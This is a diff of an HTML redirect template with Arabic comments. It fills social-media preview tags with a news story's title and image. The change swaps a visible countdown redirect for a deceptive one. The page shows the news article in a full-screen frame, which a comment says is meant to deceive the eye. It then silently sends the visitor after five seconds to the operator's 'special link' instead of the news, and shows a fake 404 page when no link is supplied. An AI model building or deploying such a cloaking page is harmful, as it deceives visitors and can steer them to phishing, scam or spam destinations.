@@ -4,59 +4,129 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- هذه الكلمات سيتم استبدالها تلقائياً -->
+    <!-- البيانات الوصفية (يتم ملؤها تلقائياً لجلب صورة الخبر) -->
     <title>{{TITLE}}</title>
     <meta property="og:title" content="{{TITLE}}">
-    <meta property="og:description" content="انقر للانتقال إلى الخبر">
+    <meta property="og:description" content=" ">
     <meta property="og:image" content="{{IMAGE}}">
     <meta property="og:url" content="{{LINK}}">
     
-    <!-- دعم تويتر و Getter -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="{{TITLE}}">
     <meta name="twitter:image" content="{{IMAGE}}">
 
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: Arial, sans-serif; background: #f4f4f4; }
-        #header-bar {
-            background: #333; color: #fff; text-align: center; padding: 0 15px;
-            height: 60px; display: flex; align-items: center; justify-content: center;
-            position: fixed; top: 0; width: 100%; z-index: 1000;
+        body, html { 
+            margin: 0; 
+            padding: 0; 
+            height: 100%; 
+            overflow: hidden; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #ffffff; 
         }
-        iframe { width: 100%; height: calc(100vh - 60px); margin-top: 60px; border: none; background: white;}
-        .timer-box { font-size: 18px; }
-        #timer { color: #e74c3c; font-weight: bold; padding: 0 5px;}
-        .btn { margin-right: 15px; padding: 5px 15px; background: #e74c3c; color: white; border: none; cursor: pointer; border-radius: 4px; }
+
+        /* تنسيق الإطار (عرض الخبر في الخلفية) */
+        iframe { 
+            width: 100%; 
+            height: 100vh; 
+            border: none; 
+            display: none; 
+        }
+
+        /* --- تصميم صفحة الخطأ 404 الاحترافي --- */
+        #error-page {
+            display: none; 
+            height: 100vh;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #1a1a1a;
+            color: #fff;
+            text-align: center;
+        }
+
+        #error-page h1 {
+            font-size: 8rem;
+            margin: 0;
+            color: #e74c3c;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
+        }
+
+        #error-page h2 {
+            font-size: 2rem;
+            margin: 10px 0;
+        }
+
+        #error-page p {
+            color: #bbb;
+            font-size: 1.2rem;
+            max-width: 600px;
+            margin: 20px auto;
+            line-height: 1.6;
+        }
+
+        .home-btn {
+            margin-top: 30px;
+            padding: 15px 40px;
+            background: #3498db;
+            color: white;
+            text-decoration: none;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            transition: background 0.3s;
+            display: inline-block;
+        }
+
+        .home-btn:hover {
+            background: #2980b9;
+        }
     </style>
 </head>
 <body>
 
-    <div id="header-bar">
-        <div class="timer-box">سيتم نقلك للخبر خلال <span id="timer">10</span> ثوانٍ</div>
-        <button class="btn" onclick="goNow()">انتقال فوراً</button>
+    <!-- قسم الخطأ 404 -->
+    <div id="error-page">
+        <h1>404</h1>
+        <h2>رابط مفقود</h2>
+        <p>عذراً، الرابط الذي تحاول الوصول إليه غير موجود.</p>
+        <!-- هذا الزر يظهر فقط في صفحة الخطأ -->
+        <a href="https://google.com" class="home-btn">العودة للرئيسية</a>
     </div>
 
-    <!-- سيتم وضع الرابط هنا -->
-    <iframe id="frame" src="{{LINK}}"></iframe>
+    <!-- الإطار الذي سيعرض الخبر -->
+    <iframe id="main-frame" src=""></iframe>
 
     <script>
-        // الرابط يتم حقنه هنا أيضاً
-        const targetUrl = "{{LINK}}";
-        let timeLeft = 10;
-        const timerElem = document.getElementById('timer');
+        // ---------------- إعداداتك هنا ----------------
 
-        function goNow() {
-            window.location.href = targetUrl;
+        // 1. ضع هنا الرابط الذي تريد تحويل الزوار إليه (رابطك الخاص)
+        const mySpecialLink = "https://www.google.com"; 
+
+        // 2. مدة الانتظار قبل التحويل (5000 = 5 ثواني)
+        const waitTime = 5000; 
+
+        // -----------------------------------------------
+
+        // الرابط القادم من العنوان (الخبر)
+        const newsLink = "{{LINK}}";
+
+        // المنطق البرمجي
+        if (newsLink === "404" || newsLink === "" || newsLink === "{{LINK}}") {
+            // حالة الخطأ: لا يوجد رابط خبر في العنوان
+            document.getElementById('error-page').style.display = 'flex';
+        } else {
+            // حالة النجاح: يوجد رابط خبر
+            
+            // 1. نعرض صفحة الخبر داخل الإطار لخداع العين
+            const frame = document.getElementById('main-frame');
+            frame.src = newsLink;
+            frame.style.display = 'block';
+
+            // 2. ننتظر ثم نحول الزائر لرابطك الخاص (وليس الخبر)
+            setTimeout(() => {
+                window.location.href = mySpecialLink;
+            }, waitTime);
         }
-
-        const countdown = setInterval(() => {
-            timeLeft--;
-            timerElem.textContent = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                goNow();
-            }
-        }, 1000);
     </script>
 
 </body>
